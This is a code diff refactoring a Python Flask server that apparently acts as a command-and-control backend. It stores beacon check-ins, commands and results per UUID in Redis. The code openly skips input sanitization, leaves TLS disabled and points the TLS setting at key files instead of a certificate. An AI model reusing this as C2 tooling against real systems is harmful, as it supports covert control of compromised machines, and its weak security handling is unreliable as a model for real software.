@@ -83,22 +83,15 @@ def session():
             nonce = connector["Nonce"]
             signature = connector["Signature"]
             print(signature)
-            # Set the command to 0
-            structure = {
-                "WhoAmI": f"{whoami}",
-                "Nonce": f"{nonce}",
-                "Signature": f"{signature}",
-                "Retrieved": "1",  # Set retrieved to 1 so we know we got results
-                "Command": "0",
-                "LastInteraction": f"{LastInteraction}",
-                "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
-                "Result": f"{result}",
-                "GotIt": "0"
-            }
-            structure = json.dumps(structure)  # Dump the json
-            # Write the message value to the beacon:UUID key
-            conn.hset('UUID', uuid, structure)
-            #signature = str(signature)
+            #whoami, nonce, signature, retrieved, command, last interaction, last check in, result, got it
+            dataSet = dbParameters(whoami, nonce, signature, 1, 0, LastInteraction,
+                                   datetime.today().strftime('%Y-%m-%d %H:%M:%S'), result, 0)
+            if set(uuid).difference(string.ascii_letters + string.digits):
+                # We're not going to bother with input sanitization here
+                # If we receive special characters just drop it entirely
+                pass
+            else: updateDB(dataSet, uuid)
+
             resp = Response(
                 response=command, status=302, mimetype="text/plain")
             resp.headers['Verifier'] = signature
@@ -124,34 +117,21 @@ def schema():
     connector = json.loads(structure)  # Load it into a new var
     LastInteraction = connector["LastInteraction"]
     whoami = connector["WhoAmI"]
-    #key = connector["private-key"]
-    print(request.headers)
+    # whoami, nonce, signature, retrieved, command, last interaction, last check in, result, got it
+    dataSet = dbParameters(whoami, 0, 0, 1, 0, LastInteraction,
+                           datetime.today().strftime('%Y-%m-%d %H:%M:%S'), result, 1)
     if set(uuid).difference(string.ascii_letters + string.digits):
         # We're not going to bother with input sanitization here
         # If we receive special characters just drop it entirely
         pass
     else:
-        # Let's convert the command struct to a JSON object
-        structure = {
-            "WhoAmI": f"{whoami}",
-            "Nonce": f"0",
-            "Signature": "0",
-            "Retrieved": "1",  # Set retrieved to 1 so we know we got results
-            "Command": "0",
-            "LastInteraction": f"{LastInteraction}",
-            "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
-            "Result": f"{result}",
-            "GotIt": "1"
-        }
-        structure = json.dumps(structure)  # Dump the json
-        # Write the message value to the beacon:UUID key
-        conn.hset('UUID', uuid, structure)
+        updateDB(dataSet, uuid)
         return ''
 
 
 def serve():
-    context = ('cert.pem', 'key.pem')
-    app.run(host=f"{sys.argv[1]}", port=sys.argv[2])#, ssl_context=context)
+    context = ('../ca.key', '../server.key')
+    app.run(host=sys.argv[1], port=sys.argv[2])#, ssl_context=context)
 
 
 if __name__ == "__main__":
